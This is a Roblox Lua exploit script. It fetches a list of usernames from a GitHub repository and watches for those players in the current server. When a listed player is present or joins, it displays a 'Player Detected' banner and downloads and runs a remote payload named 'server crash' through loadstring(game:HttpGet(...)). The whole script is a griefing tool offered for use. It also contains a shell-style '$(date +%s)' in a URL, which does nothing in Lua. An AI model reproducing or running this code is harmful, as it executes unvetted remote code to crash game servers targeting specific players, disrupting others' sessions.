local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local PlayerGui = game.Players.LocalPlayer:WaitForChild("PlayerGui")

-- GitHub URL for the list of usernames
local url = "https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/sweats?token=$(date +%s)"

-- Table to store usernames fetched from the URL
local usernamesToCheck = {}

-- Create ScreenGui and TextLabel for displaying the message
local screenGui = Instance.new("ScreenGui")
screenGui.Parent = PlayerGui

local textLabel = Instance.new("TextLabel")
textLabel.Parent = screenGui
textLabel.Size = UDim2.new(0, 300, 0, 50)  -- Adjust the size as needed
textLabel.Position = UDim2.new(0.5, -150, 0, 20)  -- Position at the top-center of the screen
textLabel.BackgroundTransparency = 1  -- No background
textLabel.TextColor3 = Color3.fromRGB(255, 255, 255)  -- Default white color
textLabel.TextSize = 24
textLabel.Text = ""  -- Empty initially
textLabel.Font = Enum.Font.SourceSansBold

-- Function to fetch and update the usernames from the GitHub URL
local function updateUsernames()
    local success, result = pcall(function()
        return game:HttpGet(url)
    end)
    
    if success then
        -- Split the result into lines and populate the table
        usernamesToCheck = {}
        for line in result:gmatch("[^\r\n]+") do
            table.insert(usernamesToCheck, line)
        end
        print("Usernames successfully updated.")
    else
        warn("Failed to fetch usernames: " .. tostring(result))
    end
end

-- Function to check if a username is in our list
local function isInList(username)
    for _, name in ipairs(usernamesToCheck) do
        if name:lower() == username:lower() then
            return true
        end
    end
    return false
end

-- Function to display the RGB text at the top of the screen
local function displayDetectedText(username)
    local colors = {Color3.fromRGB(255, 0, 0), Color3.fromRGB(0, 255, 0), Color3.fromRGB(0, 0, 255)}  -- RGB colors
    local index = 1
    textLabel.Text = "Player Detected: " .. username
    
    -- Change color dynamically for effect
    while textLabel.Text == "Player Detected: " .. username do
        textLabel.TextColor3 = colors[index]
        index = index % #colors + 1  -- Loop through colors
        wait(0.5)  -- Change color every half second
    end
end

-- Update usernames on script start
updateUsernames()

-- Check existing players
for _, player in ipairs(Players:GetPlayers()) do
    if isInList(player.Name) then
        displayDetectedText(player.Name)  -- Show the detected player on the screen
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
    end
end

-- Monitor for new players joining
Players.PlayerAdded:Connect(function(player)
    if isInList(player.Name) then
        displayDetectedText(player.Name)  -- Show the detected player on the screen
        loadstring(game:HttpGet("https://raw.githubusercontent.com/n0raxd/the-sweat-list/refs/heads/main/server%20crash"))()
    end
end)
